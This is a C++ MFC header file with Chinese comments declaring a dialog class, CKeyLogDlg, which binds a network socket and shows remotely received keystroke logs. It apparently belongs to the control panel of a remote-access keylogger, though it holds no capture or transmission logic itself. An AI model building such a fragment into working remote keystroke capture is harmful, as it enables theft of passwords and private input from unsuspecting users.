#pragma once
#include "afxwin.h"
#include ".\servergetkeynohookhandle.h"

// CKeyLogDlg 对话框

class CKeyLogDlg : public CDialog
{
	DECLARE_DYNAMIC(CKeyLogDlg)

public:
	CKeyLogDlg(CWnd* pParent = NULL);   // 标准构造函数
	virtual ~CKeyLogDlg();

// 对话框数据
	enum { IDD = IDD_DIALOG_KEYLOG };
	void Layout();
	void BindSocket(SOCKET s)
	{
		m_hServer.Attach(s);
	}
protected:
	CServerGetKeyNoHookHandle m_hServer;
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedOk();
	virtual BOOL OnInitDialog();
	CEdit m_EditLog;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnTimer(UINT nIDEvent);
};
